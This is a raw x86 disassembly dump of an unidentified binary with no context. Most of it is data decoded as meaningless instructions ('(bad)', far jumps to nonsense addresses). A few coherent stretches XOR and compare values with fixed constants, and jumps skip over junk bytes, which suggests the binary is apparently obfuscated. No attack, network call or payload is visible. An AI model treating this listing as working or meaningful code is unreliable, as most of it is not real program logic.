  405e1c:	imul   esp,DWORD PTR [eax+0x60],0x86aa9555
  405e23:	sub    al,0x95
  405e25:	cmp    bl,bl
  405e27:	ss sahf 
  405e29:	add    eax,0xd950dba9
  405e2e:	push   edx
  405e2f:	inc    edi
  405e30:	(bad)  
  405e31:	mov    edx,ss
  405e33:	jnp    0x405ea8
  405e35:	and    DWORD PTR [ebx+0x6b77682a],edx
  405e3b:	inc    esp
  405e3c:	inc    esi
  405e3d:	mov    BYTE PTR [eax-0x4c],dh
  405e40:	xor    al,BYTE PTR [edx+0x50]
  405e43:	retf   
  405e44:	pop    esi
  405e45:	bound  ebp,QWORD PTR [edx-0x18f344a3]
  405e4b:	icebp  
  405e4c:	inc    edi
  405e4d:	loopne 0x405e49
  405e4f:	or     al,0x70
  405e51:	mov    esp,0xd92b13d2
  405e56:	ja     0x405deb
  405e58:	add    BYTE PTR [ebp-0x74],bl
  405e5b:	sub    BYTE PTR [esi+0x14],ah
  405e5e:	pop    ds
  405e5f:	leave  
  405e60:	mov    ecx,DWORD PTR [esi+0x4]
  405e63:	mov    ecx,eax
  405e65:	shl    ecx,0x1e
  405e68:	xor    ecx,0x80000000
  405e6e:	mov    DWORD PTR [ebp-0x64],ecx
  405e71:	mov    ecx,DWORD PTR [esi]
  405e73:	mov    edx,DWORD PTR [esi+0x4]
  405e76:	jmp    0x406217
  405e7b:	pusha  
  405e7c:	adc    bh,BYTE PTR ds:0x60b2b35d
  405e82:	adc    al,0xa6
  405e84:	pop    es
  405e85:	fnstsw WORD PTR ds:[esi]
  405e88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e89:	rcl    DWORD PTR [eax-0x4141d242],1
  405e8f:	mov    ebp,0x18bebec4
  405e94:	push   ebp
  405e95:	sbb    eax,esp
  405e97:	cmp    ebx,DWORD PTR [ebx+ebx*2-0x739c2def]
  405e9e:	sub    BYTE PTR [eax+0x49],al
  405ea1:	jmp    0xdd08249d
  405ea6:	cld    
  405ea7:	shr    DWORD PTR [edx],cl
  405ea9:	ret    0xebb2
  405eac:	jg     0x405e7f
  405eae:	repnz cmp ch,dh
  405eb1:	and    al,0x67
  405eb3:	ror    DWORD PTR [edx],cl
  405eb5:	push   esp
  405eb6:	mov    DWORD PTR [eax+0x16],edx
  405eb9:	push   esp
  405eba:	push   esp
  405ebb:	ds jecxz 0x405e65
  405ebe:	jnp    0x405efb
  405ec0:	scas   eax,DWORD PTR es:[edi]
  405ec1:	out    dx,al
  405ec2:	es test eax,0xfde18674
  405ec8:	push   0x707675ef
  405ecd:	hlt    
  405ece:	inc    ecx
  405ecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ed0:	pop    esi
  405ed1:	mov    cl,0x32
  405ed3:	dec    ebp
  405ed4:	les    eax,FWORD PTR fs:[edi+0x31c807fd]
  405edb:	shl    bl,cl
  405edd:	cmp    eax,0x5fe857df
  405ee2:	add    eax,0xb9a44f46
  405ee7:	push   esi
  405ee8:	pop    ebp
  405ee9:	inc    eax
  405eea:	xchg   esp,eax
  405eeb:	shl    BYTE PTR [eax],1
  405eed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405eee:	(bad)  
  405eef:	jns    0x405ec9
  405ef1:	pop    eax
  405ef2:	mov    al,ds:0x89f68e7a
  405ef7:	cmp    eax,DWORD PTR [esp+eax*1-0x60]
  405efb:	push   edi
  405efc:	int    0x30
  405efe:	cmp    DWORD PTR [esi+0x3],0x14531f45
  405f05:	sbb    esi,edi
  405f07:	mov    ds:0x3e536ef,al
  405f0c:	dec    ecx
  405f0d:	cmp    eax,0x525a9492
  405f12:	inc    edx
  405f13:	inc    ebx
  405f14:	sti    
  405f15:	ja     0x405ef7
  405f17:	inc    ebx
  405f18:	pop    ecx
  405f19:	cmp    DWORD PTR [edx-0x35df01cc],esp
  405f1f:	dec    esp
  405f20:	mov    edi,0x96b110b3
  405f25:	cmp    dh,BYTE PTR [ecx-0x61]
  405f28:	cmp    ebp,DWORD PTR [edx]
  405f2a:	push   cs
  405f2b:	(bad)  
  405f2c:	or     DWORD PTR [edx],edi
  405f2e:	les    esp,FWORD PTR [ebx+edi*4-0x4aa425ef]
  405f35:	into   
  405f36:	jge    0x405ec1
  405f38:	cmc    
  405f39:	inc    esi
  405f3a:	nop
  405f3b:	push   edx
  405f3c:	sub    ebp,0x957000e
  405f42:	inc    ebx
  405f43:	cdq    
  405f44:	sub    esp,DWORD PTR [ecx-0x606eb943]
  405f4a:	fnstcw WORD PTR [esi+0x57a7cab5]
  405f50:	pop    eax
  405f51:	ins    BYTE PTR es:[edi],dx
  405f52:	inc    esi
  405f53:	cmc    
  405f54:	mov    edi,0x47ca510e
  405f59:	sub    esp,DWORD PTR [esi-0x37]
  405f5c:	in     al,0xbb
  405f5e:	sbb    esp,DWORD PTR [edx+0x7d]
  405f61:	int    0x8f
  405f63:	mov    bl,BYTE PTR [edx+0x53]
  405f66:	js     0x405f9b
  405f68:	rcl    DWORD PTR [ebx],cl
  405f6a:	jmp    0x9ca1:0xc8641fa2
  405f71:	adc    DWORD PTR [esi+ebp*4+0x550b459d],eax
  405f78:	int    0x73
  405f7a:	repnz sar DWORD PTR [edx],1
  405f7d:	cmp    eax,0x275096d0
  405f82:	out    dx,eax
  405f83:	std    
  405f84:	push   es
  405f85:	(bad)  
  405f86:	loopne 0x405f94
  405f88:	mov    dl,0xc0
  405f8a:	xchg   ebx,eax
  405f8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f8c:	(bad)  
  405f8d:	fsubr  QWORD PTR ds:0x673b886
  405f93:	mov    cl,0x6c
  405f95:	jmp    0x999f:0x3d9032ed
  405f9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f9d:	rol    esp,cl
  405f9f:	rcl    DWORD PTR [eax+0x73],0x15
  405fa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405fa4:	cmpxchg DWORD PTR [ebx-0xd],eax
  405fa8:	mov    edx,0x84c6b3bc
  405fad:	in     al,0x7f
  405faf:	pop    cx
  405fb1:	jl     0x405f98
  405fb3:	daa    
  405fb4:	sbb    esi,DWORD PTR [ebx-0x79]
  405fb7:	stc    
  405fb8:	mov    esp,0xfa998d78
  405fbd:	bound  ecx,QWORD PTR [ecx-0x3]
  405fc0:	in     al,dx
  405fc1:	or     esp,DWORD PTR [edi+0x24]
  405fc4:	inc    edx
  405fc5:	cmp    al,0x1
  405fc7:	push   0x28
  405fc9:	test   eax,esi
  405fcb:	(bad)  
  405fcc:	mov    edi,0x90c824a9
  405fd1:	pop    ds
  405fd2:	imul   BYTE PTR [ebx-0x1d2aa1af]
  405fd8:	test   eax,0xc7247034
  405fdd:	add    BYTE PTR [ebp-0x57],al
  405fe0:	es call 0x4bb5:0xa1e32556
  405fe8:	adc    eax,0x86563483
  405fed:	repnz sub BYTE PTR [edi],ah
  405ff0:	jecxz  0x405fa6
  405ff2:	mov    esp,0x40fae060
  405ff7:	mov    bh,0x74
  405ff9:	mov    ah,0x18
  405ffb:	dec    eax
  405ffc:	mov    edx,0x3635bdf4
  406001:	aam    0x84
  406003:	in     al,dx
  406004:	ds push edx
  406006:	xchg   al,bl
  406008:	xchg   esp,eax
  406009:	sub    ebx,eax
  40600b:	(bad)  [eax-0x21]
  40600e:	sbb    dh,BYTE PTR [ebx]
  406010:	mov    al,0xf4
  406012:	mov    BYTE PTR [ecx-0x561f39e1],cl
  406018:	xchg   DWORD PTR [esi],ebp
  40601a:	add    bl,BYTE PTR [ecx-0x2eed9ba]
  406020:	mov    ds:0xb0f0d1df,al
  406025:	xchg   bl,dh
  406027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406028:	pop    esi
  406029:	mul    esi
  40602b:	push   ds
  40602c:	hlt    
  40602d:	adc    BYTE PTR [edx-0x3a],bl
  406030:	jne    0x2cdecf03
  406036:	jp     0x406080
  406038:	sub    eax,0xfd691bf5
  40603d:	xchg   ecx,eax
  40603e:	jmp    0x406060
  406040:	xor    BYTE PTR [ecx-0xe],0xda
  406044:	call   0x32ba93e1
  406049:	push   ebp
  40604a:	cmp    edx,DWORD PTR [esp+ebp*2]
  40604d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40604e:	jno    0x406013
  406050:	loop   0x405fda
  406052:	jmp    0xff97:0xbf51f30
  406059:	add    al,0x1a
  40605b:	(bad)  
  40605c:	xor    eax,0xbe8a6b7b
  406061:	lds    ebp,FWORD PTR [edi-0xe]
  406064:	pop    ebx
  406065:	push   es
  406066:	mov    edx,0x494d9ce2
  40606b:	mov    al,0x56
  40606d:	retf   
  40606e:	sbb    ah,BYTE PTR [ecx+0x2d5d7624]
  406074:	inc    edi
  406075:	push   edx
  406076:	mov    ecx,0x16a225e7
  40607b:	sbb    cl,BYTE PTR [eax+0x49dca466]
  406081:	mov    eax,ds:0x939c4e2c
  406086:	xchg   ecx,eax
  406087:	sbb    eax,DWORD PTR [ebx-0x3aa0240f]
  40608d:	loop   0x406024
  40608f:	sub    BYTE PTR [edi-0x5a6409f0],dh
  406095:	cmp    ah,al
  406097:	test   eax,0x4d34d009
  40609c:	out    dx,al
  40609d:	adc    BYTE PTR [edi+ebp*1+0x541cb0b7],0xaf
  4060a5:	test   eax,0xc97abc78
  4060aa:	idiv   BYTE PTR [edx]
  4060ac:	or     al,0x44
  4060ae:	mov    al,0x46
  4060b0:	mov    dh,BYTE PTR [ebp+0x61]
  4060b3:	mov    al,0xb0
  4060b5:	and    esp,DWORD PTR [eax-0x39]
  4060b8:	mov    eax,ds:0xc46365e1
  4060bd:	stc    
  4060be:	or     al,0x79
  4060c0:	imul   edi,edx,0xcfbd429c
  4060c6:	xor    esi,DWORD PTR [esi-0x78]
  4060c9:	dec    ecx
  4060ca:	cmp    BYTE PTR [ebx],bh
  4060cc:	mov    ebp,0x5600efb
  4060d1:	and    ebp,DWORD PTR [edi+ebx*2-0x11]
  4060d5:	das    
  4060d6:	pusha  
  4060d7:	sbb    BYTE PTR [ebx-0x2b],bl
  4060da:	xor    ecx,DWORD PTR [ebx]
  4060dc:	lods   al,BYTE PTR ds:[esi]
  4060dd:	fbstp  TBYTE PTR [edx-0x7e9c11b8]
  4060e3:	call   0xa359:0xb6af885a
  4060ea:	pop    esi
  4060eb:	(bad)  
  4060ec:	sahf   
  4060ed:	das    
  4060ee:	mov    es,WORD PTR [eax-0x2721f628]
  4060f4:	les    edx,FWORD PTR [esi]
  4060f6:	adc    al,0x4f
  4060f8:	stc    
  4060f9:	push   0x40
  4060fb:	rol    DWORD PTR [esi],1
  4060fd:	(bad)  
  4060fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406100:	sti    
  406101:	idiv   DWORD PTR [ecx+esi*2+0x6f]
  406105:	iret   
  406106:	and    al,0x13
  406108:	repnz (bad) 
  40610a:	mov    esi,0xda3e0332
  40610f:	in     al,dx
  406110:	push   edi
  406111:	shr    BYTE PTR [edi-0x18],0xe7
  406115:	mov    al,0x79
  406117:	nop
  406118:	pop    ecx
  406119:	xor    al,0x0
  40611b:	sbb    BYTE PTR [eax-0x2fe069fe],0x21
  406122:	jno    0x4060ce
  406124:	test   DWORD PTR ds:0x2c67ee53,edx
  40612a:	push   ss
  40612b:	rol    BYTE PTR [ebx],0x3e
  40612e:	arpl   WORD PTR [esi+0x32],ax
  406131:	add    eax,0x9c66b310
  406136:	inc    ebx
  406137:	or     al,0x61
  406139:	dec    esp
  40613a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40613b:	mov    ebp,esi
  40613d:	push   esi
  40613e:	cwde   
  40613f:	inc    esi
  406140:	popf   
  406141:	mov    ebx,0x208025ca
  406146:	retf   0x5d7b
  406149:	shr    BYTE PTR [ebp+ebp*8-0x6],cl
  40614d:	xlat   BYTE PTR ds:[ebx]
  40614e:	test   DWORD PTR [eax-0x19],edi
  406151:	pop    ecx
  406152:	(bad)  
  406153:	jmp    0x19a7b5db
  406158:	sub    ebp,DWORD PTR ds:0xcfb6b9e7
  40615e:	sahf   
  40615f:	pop    edx
  406160:	mov    ah,0x8b
  406162:	push   eax
  406163:	(bad)  
  406164:	xchg   ecx,eax
  406165:	int    0x74
  406167:	(bad)  [ebx-0x9967e9b]
  40616d:	pop    ds
  40616e:	sti    
  40616f:	in     al,dx
  406170:	adc    esp,DWORD PTR [esi+0x10]
  406173:	or     DWORD PTR ds:0xe7fd9af8,0xffffffeb
  40617a:	sbb    BYTE PTR [edx],ch
  40617c:	adc    al,BYTE PTR [eax-0x44c5699e]
  406182:	in     eax,0x86
  406184:	sub    al,0x38
  406186:	xor    BYTE PTR [edx+0x99cc29f],0xff
  40618d:	and    DWORD PTR [ebx-0x3f],0xfffffff3
  406191:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406192:	test   BYTE PTR [esi+0xa],al
  406195:	int    0xf4
  406197:	fsubr  DWORD PTR [eax+0x7ccfa238]
  40619d:	(bad)  
  40619e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40619f:	call   0x15a7:0xf76a3468
  4061a6:	xchg   esp,eax
  4061a7:	pop    eax
  4061a8:	xor    eax,0xa8b6fec6
  4061ad:	test   eax,0xe0b99147
  4061b2:	mov    ch,0xba
  4061b4:	dec    eax
  4061b5:	scas   eax,DWORD PTR es:[edi]
  4061b6:	xlat   BYTE PTR ds:[ebx]
  4061b7:	ficomp DWORD PTR [eax-0x3]
  4061ba:	ins    DWORD PTR es:[edi],dx
  4061bb:	cmp    al,0xb3
  4061bd:	sub    eax,0x8713314d
  4061c2:	push   es
  4061c3:	cmp    bl,dh
  4061c5:	pop    ds
  4061c6:	dec    esi
  4061c7:	xchg   ecx,eax
  4061c8:	cmp    al,0xac
  4061ca:	xchg   DWORD PTR [ebx+0x1],ebx
  4061cd:	add    al,0x3c
  4061d0:	pushf  
  4061d1:	adc    ch,BYTE PTR [ebx]
  4061d3:	add    BYTE PTR [eax-0x7d557ad5],cl
  4061d9:	or     al,0x29
  4061db:	mov    esi,0xec24e0d7
  4061e0:	dec    edx
  4061e1:	push   cs
  4061e2:	mov    edi,ebp
  4061e4:	lock mov ebx,0x1662772d
  4061ea:	push   0xb181e15a
  4061ef:	sbb    bh,BYTE PTR [esi-0x7a]
  4061f2:	xchg   esi,eax
  4061f3:	adc    al,0xb7
  4061f5:	cmc    
  4061f6:	adc    eax,0xc8dca6d7
  4061fb:	pop    edx
  4061fc:	lock scas eax,DWORD PTR es:[edi]
  4061fe:	aaa    
  4061ff:	jnp    0x40622b
  406201:	jne    0x406216
  406203:	mov    edx,0xfc87e03f
  406209:	sti    
  40620a:	sub    DWORD PTR [ebx+0x40],eax
  40620d:	push   esp
  40620e:	outs   dx,BYTE PTR ds:[esi]
  40620f:	xchg   esi,eax
  406210:	sub    al,0xc6
  406212:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406213:	xchg   edx,eax
  406214:	mov    al,0x2f
  406216:	leave  
  406217:	xor    edx,0x9c2b8ae8
  40621d:	xor    ecx,0xcb79b577
  406223:	shrd   ecx,edx,0x2
  406227:	shr    edx,0x2
  40622a:	or     edx,DWORD PTR [ebp-0x64]
  40622d:	xor    eax,eax
  40622f:	or     ecx,eax
  406231:	mov    eax,DWORD PTR [ebx]
  406233:	mov    DWORD PTR [ebp-0x2c],edx
  406236:	mov    edx,DWORD PTR [ebx+0x4]
  406239:	mov    edx,eax
  40623b:	xor    eax,eax
  40623d:	shl    edx,0x1e
  406240:	xor    edx,0x80000000
  406246:	mov    DWORD PTR [ebp-0x70],eax
  406249:	mov    eax,DWORD PTR [ebx]
  40624b:	mov    DWORD PTR [ebp-0x6c],edx
  40624e:	mov    edx,DWORD PTR [ebx+0x4]
  406251:	xor    eax,0xcb79b577
  406256:	xor    edx,0x9c2b8ae8
  40625c:	shrd   eax,edx,0x2
  406260:	or     eax,DWORD PTR [ebp-0x70]
  406263:	shr    edx,0x2
  406266:	mov    DWORD PTR [ebp-0x38],eax
  406269:	mov    eax,edx
  40626b:	or     eax,DWORD PTR [ebp-0x6c]
  40626e:	mov    DWORD PTR [ebp-0x5c],edx
  406271:	cmp    ecx,DWORD PTR [ebp-0x38]
  406274:	jne    0x405a82
  40627a:	cmp    DWORD PTR [ebp-0x2c],eax
  40627d:	je     0x408bb3
  406283:	jmp    0x405a82
  406288:	mov    eax,DWORD PTR [esi]
  40628a:	mov    ecx,DWORD PTR [esi+0x4]
  40628d:	mov    ecx,eax
  40628f:	shl    ecx,0x1e
  406292:	xor    ecx,0x80000000
  406298:	mov    DWORD PTR [ebp+0x14],ecx
  40629b:	mov    ecx,DWORD PTR [esi]
  40629d:	mov    edx,DWORD PTR [esi+0x4]
  4062a0:	xor    ecx,0xcb79b577
  4062a6:	xor    edx,0x9c2b8ae8
  4062ac:	shrd   ecx,edx,0x2
  4062b0:	xor    eax,eax
  4062b2:	or     ecx,eax
  4062b4:	mov    eax,DWORD PTR [ebx]
  4062b6:	mov    DWORD PTR [ebp-0x68],ecx
  4062b9:	mov    ecx,DWORD PTR [ebx+0x4]
  4062bc:	mov    ecx,eax
  4062be:	xor    eax,eax
  4062c0:	shr    edx,0x2
  4062c3:	or     edx,DWORD PTR [ebp+0x14]
  4062c6:	mov    DWORD PTR [ebp+0x10],eax
  4062c9:	mov    eax,DWORD PTR [ebx]
  4062cb:	shl    ecx,0x1e
  4062ce:	xor    ecx,0x80000000
  4062d4:	mov    DWORD PTR [ebp-0x64],edx
  4062d7:	jmp    0x406678
  4062dc:	aas    
  4062dd:	jne    0x40629e
  4062df:	arpl   ax,di
  4062e1:	jl     0x406347
  4062e3:	jns    0x40632d
  4062e5:	das    
  4062e6:	inc    esi
  4062e7:	xchg   edx,eax
  4062e8:	or     dl,BYTE PTR [edi]
  4062ea:	in     eax,0xe3
  4062ec:	mov    ebp,0xbdbebe33
  4062f1:	les    edi,FWORD PTR [esi+0x690f25be]
  4062f7:	xchg   esp,eax
  4062f8:	pop    es
  4062f9:	iret   
  4062fa:	imul   esp,DWORD PTR [ebx-0xb2755ab],0xffffffad
  406301:	pop    esi
  406302:	aad    0x7f
  406304:	inc    ebp
  406305:	mov    BYTE PTR [ebx-0x4a7ce9a0],ch
  40630b:	loopne 0x4062de
  40630d:	sub    DWORD PTR [edi-0x1d1ab74],ebp
  406313:	cwde   
  406314:	xor    dh,BYTE PTR [eax-0x4d4c358d]
  40631a:	and    DWORD PTR [edi-0x39f473d2],eax
  406320:	adc    eax,esi
  406322:	push   esi
  406323:	retf   
  406324:	cmp    BYTE PTR [edi-0x1af63b7],bl
  40632a:	jmp    0xf0b3:0x6cc84f70
  406331:	stos   DWORD PTR es:[edi],eax
  406332:	jecxz  0x406386
  406334:	bnd jae 0x4062fa
  406337:	mov    ds:0xa9942e6c,al
  40633c:	jbe    0x406301
  40633e:	jmp    FWORD PTR [ecx-0x3eb4b43d]
  406344:	repnz fistp WORD PTR [ebp+0x79]
  406348:	mov    ah,0x9d
  40634a:	pop    esi
  40634b:	repnz test al,0xc0
  40634e:	cmp    eax,0x50b21ab9
  406353:	adc    DWORD PTR [esi+0x14],ebx
  406356:	push   es
  406357:	inc    esi
  406358:	pop    ss
  406359:	push   es
  40635a:	inc    edx
  40635b:	mov    eax,ds:0xe8e852c5
  406360:	xor    dh,cl
  406362:	mov    dh,0xa2
  406364:	xor    bl,BYTE PTR [ecx-0x482b9272]
  40636a:	push   edi
  40636b:	xor    WORD PTR [eax-0x68],cx
  40636f:	sub    BYTE PTR [eax*1+0x2e13540a],ch
  406376:	(bad)  
  406377:	or     al,0x38
  406379:	into   
  40637a:	cmp    eax,DWORD PTR [edx+eax*8-0x473e8620]
  406381:	jbe    0x40632f
  406383:	pop    ecx
  406384:	std    
  406385:	int3   
  406386:	cmp    cl,BYTE PTR [edx]
  406388:	and    al,0x5e
  40638a:	mov    al,0xc1
  40638c:	add    al,0x67
  40638e:	not    cl
  406390:	push   esi
  406391:	fs std 
  406393:	dec    edi
  406394:	add    al,0xe3
  406396:	ficomp WORD PTR [ebp-0x672df330]
  40639c:	xchg   esp,eax
  40639d:	xchg   ebx,eax
  40639e:	adc    al,0x5c
  4063a0:	inc    DWORD PTR [ebx+ecx*8-0x6]
  4063a4:	mov    ah,0x94
  4063a6:	ret    
  4063a7:	(bad)  
  4063a8:	cmp    al,BYTE PTR [edx+0x1107436f]
  4063ae:	xor    bl,BYTE PTR ds:0xac848d9d
  4063b4:	je     0x406434
  4063b6:	popa   
  4063b7:	(bad)  
  4063b9:	stos   BYTE PTR es:[edi],al
  4063ba:	scas   al,BYTE PTR es:[edi]
  4063bb:	enter  0x103e,0x62
  4063bf:	mov    al,ds:0x9b64c7a2
  4063c4:	jbe    0x406439
  4063c6:	sbb    eax,0xcdfef2de
  4063cb:	add    ch,0xfc
  4063ce:	mov    dh,0x1e
  4063d0:	xlat   BYTE PTR ds:[ebx]
  4063d1:	adc    al,0x3e
  4063d3:	bound  eax,QWORD PTR [edx+0x3e]
  4063d6:	in     eax,0x5d
  4063d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063d9:	dec    ebp
  4063da:	xchg   edi,ecx
  4063dc:	fwait
  4063dd:	scas   eax,DWORD PTR es:[edi]
  4063de:	cmp    al,0xe6
  4063e1:	mov    WORD PTR [esi],cs
  4063e3:	cmp    ch,bh
  4063e5:	ret    
  4063e6:	pop    esp
  4063e7:	rcl    BYTE PTR [esi],0x5a
  4063ea:	inc    edx
  4063eb:	lods   al,BYTE PTR ds:[esi]
  4063ec:	stos   BYTE PTR es:[edi],al
  4063ed:	jbe    0x40638e
  4063ef:	(bad)  
  4063f0:	or     esi,esi
  4063f2:	daa    
  4063f3:	in     eax,0x56
  4063f5:	and    al,0xb5
  4063f7:	fimul  DWORD PTR [esi]
  4063f9:	xlat   BYTE PTR ds:[ebx]
  4063fa:	cmp    al,0xf6
  4063fc:	in     eax,0x1b
  4063fe:	xchg   ebx,eax
  4063ff:	lods   eax,DWORD PTR ds:[esi]
  406400:	out    0xf1,eax
  406402:	aad    0xc7
  406404:	push   ds
  406405:	cmc    
  406406:	pop    ebp
  406407:	pop    edi
  406408:	int3   
  406409:	aas    
  40640a:	push   dx
  40640c:	cmp    DWORD PTR [edi-0x256eac02],esp
  406412:	jae    0x406470
  406414:	(bad)
  406418:	or     cl,BYTE PTR [ecx+edi*2]
  40641b:	stc    
  40641c:	dec    eax
  40641d:	shl    dh,1
  40641f:	push   ebp
  406420:	shr    eax,0xc9
  406423:	mov    ds:0xfef8d802,eax
  406428:	dec    ebp
  406429:	push   cs
  40642a:	push   ebx
  40642b:	dec    esi
  40642c:	outs   dx,DWORD PTR ds:[esi]
  40642d:	es fs mov esi,0xf99869e2
  406434:	scas   al,BYTE PTR es:[edi]
  406435:	gs es enter 0x9d3,0xdd
  40643b:	dec    edi
  40643c:	add    edi,eax
  40643e:	inc    edi
  40643f:	jle    0x406451
  406441:	cli    
  406442:	imul   edx,ebp,0xffffffd2
  406445:	dec    eax
  406446:	addr16 push esi
  406448:	lods   al,BYTE PTR ds:[esi]
  406449:	mov    ah,BYTE PTR [eax+0x52945778]
  40644f:	or     eax,0xbd3cc66f
  406454:	pushf  
  406455:	sahf   
  406456:	sbb    eax,0x40664a41
  40645b:	xchg   edi,eax
  40645c:	add    al,0x20
  40645e:	mov    bl,0xe7
  406460:	sbb    ah,bh
  406462:	push   ebx
  406463:	(bad)  
  406464:	lds    esp,FWORD PTR [eax+edi*1+0x1a21c591]
  40646b:	out    dx,al
  40646c:	push   esp
  40646d:	rsm    
  40646f:	or     DWORD PTR [eax+ebx*2+0x7c9535b3],edi
  406476:	inc    ebp
  406477:	cwde   
  406478:	add    ebp,DWORD PTR [ebx+0x64]
  40647b:	fst    QWORD PTR [edi+0x1ca1d643]
  406481:	sub    eax,0x5d6eb776
  406486:	xchg   edx,eax
  406487:	outs   dx,BYTE PTR ds:[esi]
  406488:	pop    ebp
  406489:	std    
  40648a:	pop    esp
  40648b:	test   BYTE PTR [esi-0x685543b],ch
  406491:	jl     0x406419
  406493:	rol    ecx,cl
  406495:	jmp    0x4064a0
  406497:	in     al,dx
  406498:	push   ebx
  406499:	enter  0x4446,0x12
  40649d:	inc    ecx
  40649e:	xor    DWORD PTR [ecx],0xe8b7fbab
  4064a4:	and    eax,0x17fe5644
  4064a9:	xchg   edi,eax
  4064aa:	enter  0x4663,0x81
  4064ae:	stos   DWORD PTR es:[edi],eax
  4064af:	icebp  
  4064b0:	repnz mov edx,0xe2dec1ef
  4064b6:	add    al,dl
  4064b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064b9:	push   esi
  4064ba:	or     eax,0xc98bd83
  4064bf:	add    eax,0x57409618
  4064c4:	pusha  
  4064c5:	xchg   ebp,eax
  4064c6:	mov    eax,0x75088689
  4064cb:	pop    edx
  4064cc:	dec    ebp
  4064cd:	mov    esi,0xba1a2aa0
  4064d2:	adc    cl,BYTE PTR [edi+0x4b]
  4064d5:	adc    al,0x28
  4064d7:	cmp    eax,0x5e593b07
  4064dc:	arpl   WORD PTR [esi-0x66cecf61],sp
  4064e2:	and    ch,dh
  4064e4:	js     0x4064c2
  4064e6:	sbb    eax,0xb68adeb3
  4064eb:	mov    ebp,0x23670c0d
  4064f0:	push   ss
  4064f1:	mov    BYTE PTR [ebx],ch
  4064f3:	inc    ebp
  4064f4:	leave  
  4064f5:	and    bl,BYTE PTR [ebp+0x4a43b113]
  4064fb:	xor    ch,BYTE PTR ds:0xe0e5604d
  406501:	outs   dx,DWORD PTR ds:[esi]
  406502:	jmp    0xfa5e:0x75e320bd
  406509:	and    ch,bl
  40650b:	xor    eax,0x411318b9
  406510:	mov    ebp,0x253e148d
  406515:	mov    dh,0xc1
  406517:	retf   0xcd54
  40651a:	fisttp DWORD PTR [esi+0x6a]
  40651d:	pop    edi
  40651e:	jne    0x4064a0
  406520:	call   0x3487:0x3daa503
  406527:	inc    ebx
  406528:	mov    ebp,0x6c82d5ae
  40652d:	inc    edx
  40652e:	in     al,dx
  40652f:	mov    edx,0x39714745
  406534:	aad    0x96
  406536:	mov    edx,0x45f5836d
  40653b:	cld    
  40653c:	xchg   esi,eax
  40653d:	mov    bh,0xd4
  40653f:	cmp    al,0xb2
  406541:	jns    0x4064e8
  406543:	push   eax
  406544:	test   al,0x1b
  406546:	push   0x37
  406548:	cmp    ebp,DWORD PTR [eax]
  40654a:	clc    
  40654b:	adc    eax,0x4b238f9
  406550:	push   edx
  406551:	push   edi
  406552:	clc    
  406553:	fdiv   DWORD PTR [ebx]
  406555:	adc    cl,dl
  406557:	iret   
  406558:	jmp    0xaf50d6d6
  40655d:	push   0xffffffa2
  40655f:	push   esp
  406560:	xchg   ebx,eax
  406561:	mov    esp,0x42eefea4
  406566:	cdq    
  406567:	xor    eax,0x8886b361
  40656c:	mov    ds:0x7ef5701f,eax
  406571:	mov    esp,0xb7f1208b
  406576:	outs   dx,BYTE PTR ds:[esi]
  406577:	pop    esi
  406578:	sub    eax,0x1749cf92
  40657d:	sub    eax,0xec6c42fb
  406582:	cli    
  406583:	(bad)  
  406584:	jmp    0x7c1b:0x29605ebd
  40658b:	dec    ecx
  40658c:	nop    DWORD PTR [ecx-0x172d8bcf]
  406593:	jg     0x406606
  406595:	(bad)  
  406596:	(bad)  
  406598:	inc    ebp
  406599:	sub    ebx,DWORD PTR [eax]
  40659b:	xor    bh,BYTE PTR [edi+edi*8+0x21728831]
  4065a2:	fst    DWORD PTR [edx]
  4065a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065a5:	popa   
  4065a6:	loopne 0x406606
  4065a8:	add    BYTE PTR [eax-0x58f0a4a8],bh
  4065ae:	sar    DWORD PTR [ebp-0x41],0x3b
  4065b2:	sub    al,0x8c
  4065b4:	xchg   ebx,eax
  4065b5:	and    al,0xf1
  4065b7:	ins    BYTE PTR es:[edi],dx
  4065b8:	pop    ebp
  4065b9:	std    
  4065ba:	or     al,0x7d
  4065bc:	adc    BYTE PTR [esi+0x2f],ch
  4065bf:	(bad)  
  4065c0:	pop    esp
  4065c1:	data16 jg 0x406625
  4065c4:	sub    ah,0x25
  4065c7:	nop
  4065c8:	dec    esi
  4065c9:	or     DWORD PTR [esi-0x2c],0x16
  4065cd:	test   al,0x2f
  4065cf:	in     eax,0xde
  4065d1:	jb     0x40657b
  4065d3:	inc    esp
  4065d4:	jp     0x406631
  4065d6:	jmp    0xf861f1f2
  4065db:	fwait
  4065dc:	push   ss
  4065dd:	inc    eax
  4065de:	mov    DWORD PTR [edi-0x6b],eax
  4065e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065e2:	in     eax,dx
  4065e3:	outs   dx,BYTE PTR ds:[esi]
  4065e4:	xchg   DWORD PTR [ebp-0x21],ecx
  4065e7:	and    ebx,DWORD PTR [edx+0x314fdc09]
  4065ed:	std    
  4065ee:	xchg   esi,eax
  4065ef:	mov    ds:0xa75a442b,eax
  4065f4:	(bad)  
  4065f5:	jmp    0xaca5:0x8b021345
  4065fc:	rcl    DWORD PTR [esi+0x37],cl
  4065ff:	push   edx
  406600:	or     al,0x3a
  406602:	loope  0x406673
  406604:	add    esi,DWORD PTR [esi]
  406606:	mov    esi,0xf56b6543
  40660b:	cmp    al,0xd5
  40660d:	iret   
  40660e:	mov    bl,BYTE PTR [eax-0x33]
  406611:	push   ebp
  406612:	mov    eax,ds:0xfaadbf39
  406617:	lods   eax,DWORD PTR ds:[esi]
  406618:	enter  0xa434,0xdd
  40661c:	inc    edx
  40661d:	inc    ebx
  40661e:	popa   
  40661f:	jmp    0x4065b4
